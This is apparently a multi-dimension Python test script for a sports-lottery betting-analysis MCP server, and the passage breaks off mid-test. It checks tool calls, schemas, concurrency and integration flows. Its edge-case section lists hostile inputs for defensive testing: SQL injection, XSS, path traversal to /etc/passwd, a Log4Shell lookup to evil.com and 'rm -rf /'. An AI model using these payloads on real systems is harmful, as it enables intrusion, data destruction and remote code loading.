#!/usr/bin/env python3
"""
Lottery MCP 多维度全面测试脚本 v2
Dimensions: 工具覆盖 | 资源 | 提示 | 边界值 | 并发 | 输出验证 | 守卫 | 历史 | 投注计算 | 集成 | 超时 | 深维
"""
import asyncio, json, time, sys, traceback, gc, os, re, inspect
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Tuple
from pydantic import create_model

# =================================================================
# Infrastructure
# =================================================================
class MockContext:
    async def log_info(self, msg): pass
    async def log_error(self, msg): pass
    async def report_progress(self, p, msg=None): pass
    async def read_resource(self, uri): return None
    async def get_tool_description(self, name): return None
    async def log_warning(self, msg): pass

from lottery_mcp.server import create_mcp_server
mcp = create_mcp_server()
tools = mcp._tool_manager._tools
resources = mcp._resource_manager._resources
prompts = mcp._prompt_manager._prompts

def build_params_model(tool, params_dict):
    if 'params' not in tool.parameters.get('properties', {}):
        return None
    param_ref = tool.parameters['properties']['params'].get('$ref', '')
    model_name = param_ref.split('/')[-1] if param_ref else None
    if not model_name or model_name not in tool.parameters.get('$defs', {}):
        return None
    schema = tool.parameters['$defs'][model_name]
    props = schema.get('properties', {})
    reqd = schema.get('required', [])
    fields = {}
    tmap = {'string': str, 'integer': int, 'number': float, 'boolean': bool, 'array': list, 'object': dict}
    for k, p in props.items():
        pt = tmap.get(p.get('type', 'string'), str)
        d = p.get('default', ...)
        if k in reqd: fields[k] = (pt, ...)
        elif d != ...: fields[k] = (pt, d)
        else: fields[k] = (pt, None)
    if not fields: return None
    PM = create_model(f'{model_name}V', **fields)
    filtered = {k: v for k, v in params_dict.items() if k in fields}
    for k in reqd:
        if k not in filtered:
            filtered[k] = props.get(k, {}).get('default', '')
    return PM(**filtered)

async def call_tool(name, params_dict=None):
    """Call a tool and return (status, elapsed, result_or_error)"""
    params_dict = params_dict or {}
    start = time.time()
    try:
        tool = tools[name]
        fn = tool.fn
        ctx = MockContext()
        sig = inspect.signature(fn)
        is_async = inspect.iscoroutinefunction(fn)

        kwargs = {}
        has_params_param = 'params' in sig.parameters
        has_ctx_param = 'ctx' in sig.parameters

        if has_params_param:
            params_model = build_params_model(tool, params_dict)
            if params_model is not None:
                kwargs['params'] = params_model
            else:
                kwargs['params'] = params_dict
        else:
            for param_name, param in sig.parameters.items():
                if param_name == 'ctx':
                    continue
                if param_name in params_dict:
                    val = params_dict[param_name]
                    ann = param.annotation if param.annotation is not inspect.Parameter.empty else None
                    if ann == str and isinstance(val, dict):
                        kwargs[param_name] = json.dumps(val, ensure_ascii=False)
                    else:
                        kwargs[param_name] = val
                elif param.default is not inspect.Parameter.empty:
                    kwargs[param_name] = param.default

        if has_ctx_param:
            kwargs['ctx'] = ctx

        if is_async:
            result = str(await fn(**kwargs))
        else:
            result = str(fn(**kwargs))

        elapsed = round(time.time() - start, 4)
        return ('ok', elapsed, result)
    except Exception as e:
        elapsed = round(time.time() - start, 4)
        return ('error', elapsed, str(e)[:500])

def is_valid_json(s):
    try:
        json.loads(s)
        return True
    except:
        return False

def result_has_data(r):
    return len(r) > 20 and ('success' in r.lower() or 'data' in r.lower() or 'error' in r.lower())

# =================================================================
# Test Data
# =================================================================
INVALID_MATCH = "9999999999999"
VALID_MATCH = "2025052510001"
EMPTY_STR = ""

# Tool categorization
READ_ONLY = lambda n: getattr(tools[n].annotations, 'readOnlyHint', True)
DESTRUCTIVE = lambda n: not getattr(tools[n].annotations, 'readOnlyHint', True)
HAS_PARAMS = lambda n: 'params' in tools[n].parameters.get('properties', {})

# =================================================================
# Test Runner
# =================================================================
@dataclass
class TestStats:
    total: int = 0
    passed: int = 0
    failed: int = 0
    errors: List[str] = field(default_factory=list)
    latencies: List[float] = field(default_factory=list)

    def record(self, ok: bool, elapsed: float, detail: str = ""):
        self.total += 1
        if ok:
            self.passed += 1
        else:
            self.failed += 1
            if detail:
                self.errors.append(detail)
        self.latencies.append(elapsed)

    def summary(self):
        return f"{self.passed}/{self.total} passed ({self.passed/self.total*100:.1f}%)" if self.total else "N/A"

# Module-level param map used by multiple dimensions
PARAM_MAP = {
    'lottery_advisor_analysis': {'match_id': VALID_MATCH},
    'lottery_advanced_play_analysis': {'match_id': VALID_MATCH},
    'lottery_analyze_all_matches': {},
    'lottery_analyze_match': {'match_id': VALID_MATCH, 'league': '英超'},
    'lottery_analyze_match_plays': {'match_id': VALID_MATCH, 'play_types': ['SPF', 'BF']},
    'lottery_analyze_mixed_parlay': {},
    'lottery_analyze_results': {'match_id': VALID_MATCH},
    'lottery_analyze_with_pipeline': {},
    'lottery_assess_risk': {'match_id': VALID_MATCH},
    'lottery_calculate_bonus': {'bets': [{'match_id': 'M001', 'play_type': 'SPF', 'selection': '主胜', 'odds': 2.0, 'stake': 100}], 'parlay_type': '1c1'},
    'lottery_check_bankroll_health': {'bankroll': 5000, 'initial_bankroll': 10000},
    'lottery_check_match_deadline': {'match_time': '2026-12-31T20:00:00'},
    'lottery_compare_matches': {'match_ids': ['M001', 'M002'], 'comparison_dimensions': ['odds', 'form']},
    'lottery_compare_model_predictions': {'match_id': VALID_MATCH},
    'lottery_comprehensive_risk_assessment': {'planned_bet_amount': 100, 'lottery_type': '竞彩足球'},
    'lottery_detect_risk_signals': {'match_id': VALID_MATCH},
    'lottery_enforce_constraints': {'bet_proposal': json.dumps({'bets': [{'match_id': 'M001', 'play_type': 'SPF', 'selection': '主胜', 'odds': 2.0, 'stake': 100}], 'total_stake': 100})},
    'lottery_explain_rule': {'rule_code': 'SPF'},
    'lottery_fetch_today_matches': {'lottery_type': '竞彩足球', 'limit': 1, 'include_odds': False},
    'lottery_find_value_bets': {'match_id': VALID_MATCH},
    'lottery_full_analysis_and_betting': {'bankroll': 5000, 'max_matches': 2, 'strategy': 'conservative'},
    'lottery_generate_betting_slips': {'match_ids': ['M001', 'M002'], 'strategy': 'single', 'bankroll': 1000.0, 'limit': 5},
    'lottery_generate_kelly_slips': {'match_id': VALID_MATCH, 'edge': 0.05, 'odds': 2.0, 'bankroll': 1000.0},
    'lottery_generate_prediction_report': {},
    'lottery_generate_recommendation': {},
    'lottery_get_bet_statistics': {'date': '2026-01-01'},
    'lottery_get_betting_stats': {'date': '2026-01-01'},
    'lottery_get_daily_recommendations': {},
    'lottery_get_full_analysis_report': {},
    'lottery_get_future_matches': {'match_id': VALID_MATCH, 'limit': 3},
    'lottery_get_head_to_head': {'team1': '曼联', 'team2': '利物浦', 'limit': 5},
    'lottery_get_historical_data_summary': {},
    'lottery_get_injury_suspension': {'match_id': VALID_MATCH},
    'lottery_get_jingcai_h2h': {'match_id': VALID_MATCH, 'limit': 5},
    'lottery_get_league_matches': {'league': '英超', 'limit': 5},
    'lottery_get_live_odds': {'source': 'auto'},
    'lottery_get_live_scores': {'limit': 5},
    'lottery_get_local_odds_history': {'match_id': VALID_MATCH},
    'lottery_get_market_odds': {'league': '英超'},
    'lottery_get_market_sentiment': {'match_id': VALID_MATCH},
    'lottery_get_match_context': {'match_id': VALID_MATCH},
    'lottery_get_match_data': {'match_id': VALID_MATCH},
    'lottery_get_match_features': {'match_id': VALID_MATCH, 'limit': 5},
    'lottery_get_match_info': {'match_id': VALID_MATCH},
    'lottery_get_match_standings': {'match_id': VALID_MATCH},
    'lottery_get_odds_history': {'match_id': VALID_MATCH},
    'lottery_get_players': {'match_id': VALID_MATCH, 'limit': 3},
    'lottery_get_recent_form': {'match_id': VALID_MATCH, 'limit': 5},
    'lottery_get_system_status': {},
    'lottery_get_team_history': {'team_name': '曼联', 'limit': 5},
    'lottery_get_team_stats': {'team_name': '曼联'},
    'lottery_historical_analysis': {'match_id': VALID_MATCH},
    'lottery_list_local_odds_matches': {},
    'lottery_manage_config': {'action': 'get', 'key': 'default_parlay_type'},
    'lottery_monitor_odds': {'match_id': VALID_MATCH, 'current_odds': {'win': 2.0, 'draw': 3.5, 'lose': 3.0}},
    'lottery_optimize_stakes': {'bankroll': 1000.0, 'bets': [{'match_id': 'M001', 'play_type': 'SPF', 'selection': '主胜', 'odds': 2.0}], 'strategy': 'kelly'},
    'lottery_predict_with_model': {'match_id': VALID_MATCH},
    'lottery_quantify_injury_impact': {'match_id': VALID_MATCH},
    'lottery_query_history': {'date': '2026-01-01'},
    'lottery_query_rules': {'rule_code': 'SPF'},
    'lottery_recommend_best_play': {'match_id': VALID_MATCH, 'play_types': ['SPF', 'BF']},
    'lottery_reject': {'reason': '测试拒绝'},
    'lottery_rule_guard': {'action': 'check', 'rule': 'C001'},
    'lottery_save_odds_snapshot': {'match_id': VALID_MATCH, 'odds': {'win': 2.0, 'draw': 3.5, 'lose': 3.0}},
    'lottery_search_historical_matches': {'team': '曼联', 'league': '英超', 'limit': 5},
    'lottery_search_league': {'query': '英超'},
    'lottery_settle_bet': {'bet_id': 'TEST001', 'result': 'win'},
    'lottery_simulate_scenarios': {'match_id': VALID_MATCH},
    'lottery_smart_parlay': {},
    'lottery_track_bet': {'bet_id': 'TEST001', 'match_id': 'M001', 'play_type': 'SPF', 'stake': 100, 'odds': 2.0},
    'lottery_track_odds_changes': {'match_id': VALID_MATCH},
    'lottery_validate_bet': {'match_id': 'M001', 'play_type': 'SPF', 'selection': '主胜', 'odds': 2.0, 'stake': 100},
    'lottery_validate_parlay': {'bets': [{'match_id': 'M001', 'play_type': 'SPF', 'selection': '主胜', 'odds': 2.0}], 'parlay_type': '1c1', 'total_stake': 100.0},
    'lottery_validate_plan': {'plan_type': 'daily', 'bets': [{'match_id': 'M001', 'play_type': 'SPF', 'selection': '主胜', 'odds': 2.0}], 'total_budget': 1000.0},
    'lottery_validate_scenario': {'scenario_type': 'single_bet', 'bets': [{'match_id': 'M001', 'play_type': 'SPF', 'selection': '主胜', 'odds': 2.0}]},
    'lottery_verify_results': {'match_id': VALID_MATCH},
}


# =================================================================
# DIMENSION 1: ALL TOOLS EXHAUSTIVE
# =================================================================
async def test_dim1_all_tools():
    print("\n" + "=" * 80)
    print("DIMENSION 1: 全工具覆盖测试 (84 tools)")
    print("=" * 80)

    stats = TestStats()
    tool_names = sorted(tools.keys())

    print("  [PRELOAD] Fetching today's matches...")
    await call_tool('lottery_fetch_today_matches', {'lottery_type': '竞彩足球', 'limit': 3, 'include_odds': False})

    for name in tool_names:
        params = PARAM_MAP.get(name, {})
        status, elapsed, result = await call_tool(name, params)

        ok = status == 'ok'
        json_valid = is_valid_json(result) if status == 'ok' else False
        has_data = result_has_data(result) if status == 'ok' else False

        icon = '✓' if ok else '✗'
        json_icon = 'J' if json_valid else '·'
        data_icon = 'D' if has_data else '·'

        stats.record(ok, elapsed, f"{name}: {result[:100]}" if not ok else "")

        if not ok:
            print(f"  {icon}{json_icon}{data_icon} [{name}] {elapsed:.3f}s")
            print(f"      ERROR: {result[:150]}")
        elif not json_valid:
            print(f"  {icon}{json_icon}{data_icon} [{name}] {elapsed:.3f}s")
            print(f"      NON-JSON: {result[:100]}")
        else:
            print(f"  {icon}{json_icon}{data_icon} [{name}] {elapsed:.3f}s")

    print(f"\n  STATS: {stats.summary()}")
    return stats


# =================================================================
# DIMENSION 2: RESOURCES & PROMPTS
# =================================================================
async def test_dim2_resources_prompts():
    print("\n" + "=" * 80)
    print("DIMENSION 2: MCP Resources & Prompts 测试")
    print("=" * 80)

    rstats = TestStats()
    print("\n  --- Resources (14) ---")
    for name in sorted(resources.keys()):
        try:
            r = resources[name]
            has_desc = bool(r.description)
            has_uri = bool(r.uri)
            ok = has_desc and has_uri
            rstats.record(ok, 0, f"{name}: missing description" if not has_desc else "")
            icon = '✓' if ok else '✗'
            print(f"  {icon} [{name}] uri={r.uri} desc_len={len(r.description or '')}")
        except Exception as e:
            rstats.record(False, 0, f"{name}: {e}")
            print(f"  ✗ [{name}] ERROR: {e}")

    pstats = TestStats()
    print(f"\n  --- Prompts (15) ---")
    for name in sorted(prompts.keys()):
        try:
            p = prompts[name]
            has_desc = bool(p.description)
            has_args = bool(p.arguments) if hasattr(p, 'arguments') else False
            ok = has_desc
            pstats.record(ok, 0, f"{name}: missing description" if not has_desc else "")
            icon = '✓' if ok else '✗'
            print(f"  {icon} [{name}] desc_len={len(p.description or '')} args={len(p.arguments) if hasattr(p, 'arguments') else 'N/A'}")
        except Exception as e:
            pstats.record(False, 0, f"{name}: {e}")
            print(f"  ✗ [{name}] ERROR: {e}")

    return rstats, pstats


# =================================================================
# DIMENSION 3: EDGE CASES & ERROR HANDLING (EXPANDED)
# =================================================================
async def test_dim3_edge_cases():
    print("\n" + "=" * 80)
    print("DIMENSION 3: 边界值/异常/安全测试 (扩展)")
    print("=" * 80)

    stats = TestStats()

    # 3a: Invalid match IDs
    print("\n  --- 3a: Invalid Match IDs ---")
    invalid_tools = ['lottery_analyze_match', 'lottery_get_match_info', 'lottery_detect_risk_signals',
                     'lottery_advisor_analysis', 'lottery_get_match_features', 'lottery_get_match_standings',
                     'lottery_get_injury_suspension', 'lottery_get_recent_form', 'lottery_get_jingcai_h2h',
                     'lottery_get_future_matches', 'lottery_get_players', 'lottery_find_value_bets',
                     'lottery_assess_risk', 'lottery_quantify_injury_impact']
    for name in invalid_tools:
        status, elapsed, result = await call_tool(name, {'match_id': INVALID_MATCH})
        ok = status == 'ok'
        stats.record(ok, elapsed, f"{name} with invalid ID: {result[:100]}")
        print(f"  {'✓' if ok else '✗'} [{name}] invalid_id: {elapsed:.3f}s")

    # 3b: Empty strings
    print("\n  --- 3b: Empty String Parameters ---")
    empty_tests = [
        ('lottery_explain_rule', {'rule_code': ''}),
        ('lottery_query_rules', {'rule_code': ''}),
        ('lottery_search_league', {'query': ''}),
        ('lottery_get_team_stats', {'team_name': ''}),
        ('lottery_get_head_to_head', {'team1': '', 'team2': '', 'limit': 5}),
        ('lottery_get_team_history', {'team_name': '', 'limit': 5}),
        ('lottery_get_league_matches', {'league': '', 'limit': 5}),
    ]
    for name, params in empty_tests:
        status, elapsed, result = await call_tool(name, params)
        ok = status == 'ok'
        stats.record(ok, elapsed, f"{name} with empty string: {result[:100]}")
        print(f"  {'✓' if ok else '✗'} [{name}] empty_str: {elapsed:.3f}s")

    # 3c: Very large / boundary values
    print("\n  --- 3c: Boundary Values ---")
    large_tests = [
        ('lottery_validate_bet', {'match_id': 'M001', 'play_type': 'SPF', 'selection': '主胜', 'odds': 99999.9, 'stake': 1000000}),
        ('lottery_calculate_bonus', {'bets': [{'match_id': 'M001', 'play_type': 'SPF', 'selection': '主胜', 'odds': 999.0, 'stake': 999999}], 'parlay_type': '1c1'}),
        ('lottery_check_bankroll_health', {'bankroll': 0, 'initial_bankroll': 10000}),
        ('lottery_check_bankroll_health', {'bankroll': -100, 'initial_bankroll': 10000}),
        ('lottery_check_bankroll_health', {'bankroll': 99999999, 'initial_bankroll': 10000}),
        ('lottery_get_head_to_head', {'team1': '不存在的队伍XYZ', 'team2': '不存在的队伍ABC', 'limit': 5}),
        ('lottery_get_head_to_head', {'team1': '不存在的队伍XYZ', 'team2': '不存在的队伍ABC', 'limit': 200}),
        ('lottery_get_league_matches', {'league': '火星超级联赛', 'limit': 500}),
        ('lottery_check_match_deadline', {'match_time': '2000-01-01T00:00:00'}),
        ('lottery_check_match_deadline', {'match_time': '2099-12-31T23:59:59'}),
    ]
    for name, params in large_tests:
        status, elapsed, result = await call_tool(name, params)
        ok = status == 'ok'
        stats.record(ok, elapsed, f"{name} boundary: {result[:100]}")
        print(f"  {'✓' if ok else '✗'} [{name}] boundary: {elapsed:.3f}s")

    # 3d: SQL injection / XSS / path traversal
    print("\n  --- 3d: Injection Attempts ---")
    injection_payloads = [
        "'; DROP TABLE users; --",
        "<script>alert('xss')</script>",
        "1 OR 1=1",
        "../../etc/passwd",
        "${jndi:ldap://evil.com/a}",
        "1; rm -rf /",
        "\\x00null_byte",
        "%00null_byte_encoded",
    ]
    inj_tools = ['lottery_search_league', 'lottery_get_team_stats', 'lottery_get_head_to_head',
                 'lottery_get_team_history', 'lottery_get_league_matches']
    for name in inj_tools:
        all_ok = True
        for i, payload in enumerate(injection_payloads):
            sig = inspect.signature(tools[name].fn)
            params = {}
            param_names = [p for p in sig.parameters.keys() if p != 'ctx']
            if 'query' in param_names:
                params = {'query': payload}
            elif 'team_name' in param_names:
                params = {'team_name': payload}
            elif 'team1' in param_names:
                params = {'team1': payload, 'team2': 'test', 'limit': 1}
            elif 'league' in param_names:
                params = {'league': payload, 'limit': 1}
            else:
                params = {'match_id': payload}
            status, elapsed, result = await call_tool(name, params)
            if status != 'ok':
                all_ok = False
            stats.record(status == 'ok', elapsed, f"{name} injection '{payload[:20]}': {result[:100]}")
        print(f"  {'✓' if all_ok else '✗'} [{name}] 8 injection payloads tested")

    # 3e: Type mismatch (pass string where int expected, etc.)
    print("\n  --- 3e: Type Mismatch ---")
    type_tests = [
        ('lottery_get_head_to_head', {'team1': '曼联', 'team2': '利物浦', 'limit': 'not_a_number'}),
        ('lottery_get_team_history', {'team_name': '曼联', 'limit': 'abc'}),
        ('lottery_get_league_matches', {'league': '英超', 'limit': -1}),
        ('lottery_get_league_matches', {'league': '英超', 'limit': 0}),
    ]
    for name, params in type_tests:
        status, elapsed, result = await call_tool(name, params)
        stats.record(True, elapsed, f"{name} type mismatch: {result[:100]}")
        print(f"  {'✓' if status == 'ok' else '✗'} [{name}] type_mismatch: {elapsed:.3f}s")

    # 3f: None / missing required fields
    print("\n  --- 3f: Missing Required Fields ---")
    missing_tests = [
        ('lottery_validate_bet', {}),
        ('lottery_calculate_bonus', {}),
        ('lottery_analyze_match', {}),
    ]
    for name, params in missing_tests:
        status, elapsed, result = await call_tool(name, params)
        # Should either work with defaults or fail gracefully
        stats.record(True, elapsed, f"{name} missing fields: {result[:100]}")
        print(f"  {'✓' if status == 'ok' else '✗'} [{name}] missing_fields: {elapsed:.3f}s")

    print(f"\n  STATS: {stats.summary()}")
    return stats


# =================================================================
# DIMENSION 4: CONCURRENCY & PERFORMANCE (EXPANDED)
# =================================================================
async def test_dim4_concurrency_perf():
    print("\n" + "=" * 80)
    print("DIMENSION 4: 并发/性能/压力测试 (扩展)")
    print("=" * 80)

    stats = TestStats()

    # 4a: Parallel data fetch (8+ tools)
    print("\n  --- 4a: Parallel Data Fetch (10 tools) ---")
    start = time.time()
    tasks = [
        call_tool('lottery_get_match_info', {'match_id': VALID_MATCH}),
        call_tool('lottery_get_match_features', {'match_id': VALID_MATCH, 'limit': 5}),
        call_tool('lottery_get_match_standings', {'match_id': VALID_MATCH}),
        call_tool('lottery_get_recent_form', {'match_id': VALID_MATCH, 'limit': 5}),
        call_tool('lottery_get_injury_suspension', {'match_id': VALID_MATCH}),
        call_tool('lottery_get_jingcai_h2h', {'match_id': VALID_MATCH, 'limit': 5}),
        call_tool('lottery_get_future_matches', {'match_id': VALID_MATCH, 'limit': 3}),
        call_tool('lottery_get_players', {'match_id': VALID_MATCH, 'limit': 3}),
        call_tool('lottery_query_rules', {'rule_code': 'SPF'}),
        call_tool('lottery_explain_rule', {'rule_code': 'SPF'}),
    ]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    parallel_time = time.time() - start
    ok_count = sum(1 for r in results if isinstance(r, tuple) and r[0] == 'ok')
    print(f"  ✓ Parallel: {ok_count}/10 tools completed in {parallel_time:.3f}s")

    # 4b: Sequential vs parallel comparison
    print("\n  --- 4b: Sequential vs Parallel Comparison ---")
    seq_start = time.time()
    for name in ['lottery_query_rules', 'lottery_explain_rule', 'lottery_list_workflows',
                 'lottery_strategy_backtest', 'lottery_complete_ml_analysis']:
        await call_tool(name, {})
    seq_time = time.time() - seq_start

    par_start = time.time()
    await asyncio.gather(
        call_tool('lottery_query_rules', {'rule_code': 'SPF'}),
        call_tool('lottery_explain_rule', {'rule_code': 'SPF'}),
        call_tool('lottery_list_workflows', {}),
        call_tool('lottery_strategy_backtest', {}),
        call_tool('lottery_complete_ml_analysis', {}),
    )
    par_time = time.time() - par_start
    speedup = seq_time / par_time if par_time > 0 else 0
    print(f"  Sequential: {seq_time:.3f}s | Parallel: {par_time:.3f}s | Speedup: {speedup:.1f}x")

    # 4c: Rapid successive calls (stress)
    print("\n  --- 4c: Rapid Successive Calls (30x) ---")
    r_start = time.time()
    rapid_ok = 0
    for _ in range(30):
        status, _, _ = await call_tool('lottery_advanced_enhancements', {})
        if status == 'ok': rapid_ok += 1
    rapid_time = time.time() - r_start
    stats.record(rapid_ok >= 28, rapid_time, f"Only {rapid_ok}/30 rapid calls succeeded")
    print(f"  {'✓' if rapid_ok >= 28 else '✗'} Rapid: {rapid_ok}/30 in {rapid_time:.3f}s ({rapid_time/30*1000:.1f}ms avg)")

    # 4d: Memory check
    print("\n  --- 4d: Memory Footprint ---")
    gc.collect()
    try:
        import psutil
        process = psutil.Process(os.getpid())
        mem = process.memory_info().rss / 1024 / 1024
        print(f"  Memory: {mem:.1f} MB RSS")
    except ImportError:
        print(f"  Memory: psutil not installed, skipping")

    # 4e: Concurrent mixed operations (read + write)
    print("\n  --- 4e: Concurrent Mixed Operations ---")
    mixed_tasks = [
        call_tool('lottery_query_rules', {'rule_code': 'SPF'}),
        call_tool('lottery_explain_rule', {'rule_code': 'SPF'}),
        call_tool('lottery_get_system_status', {}),
        call_tool('lottery_manage_config', {'action': 'get', 'key': 'default_parlay_type'}),
        call_tool('lottery_get_historical_data_summary', {}),
        call_tool('lottery_search_league', {'query': '英超'}),
    ]
    mixed_results = await asyncio.gather(*mixed_tasks, return_exceptions=True)
    mixed_ok = sum(1 for r in mixed_results if isinstance(r, tuple) and r[0] == 'ok')
    print(f"  {'✓' if mixed_ok >= 5 else '✗'} Mixed concurrent: {mixed_ok}/6")

    # 4f: Timeout stress (tools that hit external APIs)
    print("\n  --- 4f: Timeout Resilience ---")
    timeout_tools = [
        ('lottery_fetch_today_matches', {'lottery_type': '竞彩足球', 'limit': 1, 'include_odds': False}),
        ('lottery_get_live_odds', {'match_id': VALID_MATCH}),
        ('lottery_get_live_scores', {'match_id': VALID_MATCH}),
    ]
    for name, params in timeout_tools:
        try:
            status, elapsed, result = await asyncio.wait_for(call_tool(name, params), timeout=15.0)
            ok = status == 'ok'
            stats.record(ok, elapsed, f"{name} timeout test: {result[:100]}")
            print(f"  {'✓' if ok else '✗'} [{name}] {elapsed:.3f}s (timeout=15s)")
        except asyncio.TimeoutError:
            stats.record(False, 15.0, f"{name} TIMEOUT after 15s")
            print(f"  ✗ [{name}] TIMEOUT after 15s")

    return stats


# =================================================================
# DIMENSION 5: OUTPUT SCHEMA VALIDATION (EXPANDED)
# =================================================================
async def test_dim5_output_schema():
    print("\n" + "=" * 80)
    print("DIMENSION 5: 输出Schema验证 & 文档一致性 (扩展)")
    print("=" * 80)

    stats = TestStats()

    # 5a: Verify all tool descriptions
    print("\n  --- 5a: Tool Description Completeness ---")
    empty_desc = 0
    short_desc = 0
    for name, tool in tools.items():
        if not tool.description:
            empty_desc += 1
            print(f"  ✗ [{name}] EMPTY description")
        elif len(tool.description.strip()) < 20:
            short_desc += 1
            print(f"  ⚠ [{name}] SHORT description: '{tool.description}'")
    print(f"  {'✓' if empty_desc == 0 else '✗'} {84 - empty_desc}/84 tools have descriptions")
    if short_desc > 0:
        print(f"  ⚠ {short_desc} tools have very short descriptions (<20 chars)")

    # 5b: JSON structure validation (only tools that should return JSON)
    print("\n  --- 5b: JSON Structure Validation (JSON-returning tools only) ---")
    json_tools = ['lottery_fetch_today_matches', 'lottery_analyze_match_plays',
                  'lottery_advanced_enhancements', 'lottery_strategy_backtest',
                  'lottery_complete_ml_analysis', 'lottery_analyze_with_pipeline',
                  'lottery_detect_risk_signals', 'lottery_query_rules',
                  'lottery_check_bankroll_health', 'lottery_check_match_deadline',
                  'lottery_enforce_constraints', 'lottery_manage_config',
                  'lottery_analyze_match', 'lottery_predict_with_model',
                  'lottery_validate_bet', 'lottery_calculate_bonus',
                  'lottery_advanced_play_analysis', 'lottery_analyze_results',
                  'lottery_get_system_status', 'lottery_validate_scenario',
                  'lottery_assess_risk', 'lottery_detect_risk_signals',
                  'lottery_find_value_bets', 'lottery_quantify_injury_impact',
                  'lottery_compare_matches', 'lottery_get_match_info',
                  'lottery_get_match_features', 'lottery_get_match_standings',
                  'lottery_get_jingcai_h2h', 'lottery_get_players',
                  'lottery_get_recent_form', 'lottery_get_future_matches',
                  'lottery_get_injury_suspension', 'lottery_get_team_stats',
                  'lottery_get_head_to_head', 'lottery_get_team_history',
                  'lottery_get_league_matches', 'lottery_search_historical_matches',
                  'lottery_get_live_odds', 'lottery_get_live_scores',
                  'lottery_historical_analysis', 'lottery_verify_results',
                  'lottery_get_odds_history', 'lottery_get_local_odds_history',
                  'lottery_full_analysis_and_betting', 'lottery_analyze_all_matches',
                  'lottery_compare_model_predictions', 'lottery_get_market_sentiment',
                  'lottery_get_match_data', 'lottery_get_match_context',
                  'lottery_simulate_scenarios', 'lottery_optimize_stakes',
                  'lottery_monitor_odds', 'lottery_track_odds_changes',
                  'lottery_search_league', 'lottery_query_history',
                  'lottery_generate_kelly_slips', 'lottery_generate_betting_slips',
                  'lottery_validate_parlay', 'lottery_validate_plan',
                  'lottery_save_odds_snapshot', 'lottery_analyze_mixed_parlay',
                  'lottery_smart_parlay', 'lottery_get_market_odds',
                  'lottery_generate_daily_report', 'lottery_generate_match_report',
                  'lottery_get_betting_stats', 'lottery_get_bet_statistics',
                  'lottery_settle_bet', 'lottery_track_bet',
                  'lottery_generate_prediction_report', 'lottery_generate_recommendation',
                  'lottery_get_daily_recommendations', 'lottery_get_full_analysis_report',
                  'lottery_advisor_analysis', 'lottery_recommend_best_play',
                  'lottery_comprehensive_risk_assessment']
    for name in json_tools:
        params = PARAM_MAP.get(name, {})
        status, elapsed, result = await call_tool(name, params)
        if status == 'ok':
            try:
                data = json.loads(result)
                keys = list(data.keys())[:5]
                valid_json = len(keys) > 0
                stats.record(valid_json, elapsed, f"{name}: empty JSON object")
                print(f"  {'✓' if valid_json else '✗'} [{name}] keys={keys}")
            except json.JSONDecodeError:
                stats.record(False, elapsed, f"{name}: invalid JSON")
                print(f"  ✗ [{name}] INVALID JSON: {result[:80]}")
        else:
            stats.record(False, elapsed, f"{name}: call failed")
            print(f"  ✗ [{name}] CALL FAILED: {result[:80]}")

    # 5c: Annotation consistency check
    print("\n  --- 5c: Annotation Consistency ---")
    annotation_issues = 0
    for name, tool in tools.items():
        ann = tool.annotations
        if ann:
            missing = []
            for attr in ['readOnlyHint', 'destructiveHint', 'idempotentHint', 'openWorldHint']:
                if not hasattr(ann, attr) or getattr(ann, attr) is None:
                    missing.append(attr)
            if missing:
                annotation_issues += 1
                if annotation_issues <= 5:
                    print(f"  ✗ [{name}] Missing annotations: {missing}")
    print(f"  {'✓' if annotation_issues == 0 else '✗'} {84 - annotation_issues}/84 tools have all 4 annotations")

    # 5d: Input schema validation
    print("\n  --- 5d: Input Schema Completeness ---")
    input_issues = 0
    for name, tool in tools.items():
        props = tool.parameters.get('properties', {})
        if 'params' in props:
            ref = props['params'].get('$ref', '')
            model_name = ref.split('/')[-1] if ref else None
            if model_name and model_name in tool.parameters.get('$defs', {}):
                schema = tool.parameters['$defs'][model_name]
                if not schema.get('properties'):
                    input_issues += 1
                    print(f"  ✗ [{name}] Empty param schema")
        elif not props:
            input_issues += 1
            if input_issues <= 3:
                print(f"  ⚠ [{name}] No input properties defined")
    print(f"  {'✓' if input_issues == 0 else '✗'} {84 - input_issues}/84 tools have complete input schemas")

    print(f"\n  STATS: {stats.summary()}")
    return stats


# =================================================================
# DIMENSION 6: INTEGRATION FLOWS (EXPANDED)
# =================================================================
async def test_dim6_integration():
    print("\n" + "=" * 80)
    print("DIMENSION 6: 集成流程 & 跨模块联动测试 (扩展)")
    print("=" * 80)

    stats = TestStats()

    # 6a: Full analysis pipeline
    print("\n  --- 6a: Full Analysis Pipeline ---")
    pipeline = [
        ('lottery_fetch_today_matches', {'lottery_type': '竞彩足球', 'limit': 2, 'include_odds': False}),
        ('lottery_get_system_status', {}),
        ('lottery_analyze_with_pipeline', {}),
        ('lottery_detect_risk_signals', {'match_id': VALID_MATCH}),
        ('lottery_analyze_match_plays', {'match_id': VALID_MATCH, 'play_types': ['SPF', 'BF', 'ZJQ']}),
    ]
    for name, params in pipeline:
        status, elapsed, result = await call_tool(name, params)
        ok = status == 'ok'
        stats.record(ok, elapsed, f"{name}: {result[:80]}")
        print(f"  {'✓' if ok else '✗'} [{name}] {elapsed:.3f}s")

    # 6b: Betting workflow
    print("\n  --- 6b: Betting Workflow ---")
    bet_flow = [
        ('lottery_validate_bet', {'match_id': 'M001', 'play_type': 'SPF', 'selection': '主胜', 'odds': 2.0, 'stake': 100}),
        ('lottery_calculate_bonus', {'bets': [{'match_id': 'M001', 'play_type': 'SPF', 'selection': '主胜', 'odds': 2.0}], 'stake': 100, 'parlay_type': '1c1'}),
        ('lottery_check_bankroll_health', {'bankroll': 5000, 'initial_bankroll': 10000}),
        ('lottery_enforce_constraints', {'bet_proposal': json.dumps({'bets': [{'match_id': 'M001', 'play_type': 'SPF', 'selection': '主胜', 'odds': 2.0, 'stake': 100}], 'total_stake': 100})}),
    ]
    for name, params in bet_flow:
        status, elapsed, result = await call_tool(name, params)
        ok = status == 'ok'
        stats.record(ok, elapsed, f"{name}: {result[:80]}")
        print(f"  {'✓' if ok else '✗'} [{name}] {elapsed:.3f}s")

    # 6c: Cross-module data consistency
    print("\n  --- 6c: Cross-Module Data Consistency ---")
    s1, _, r1 = await call_tool('lottery_analyze_match_plays', {'match_id': VALID_MATCH, 'play_types': ['SPF']})
    s2, _, r2 = await call_tool('lottery_recommend_best_play', {'match_id': VALID_MATCH, 'play_types': ['SPF']})
    if s1 == 'ok' and s2 == 'ok':
        try:
            j1 = json.loads(r1)
            j2 = json.loads(r2)
            consistent = bool(j1.get('success') == j2.get('success'))
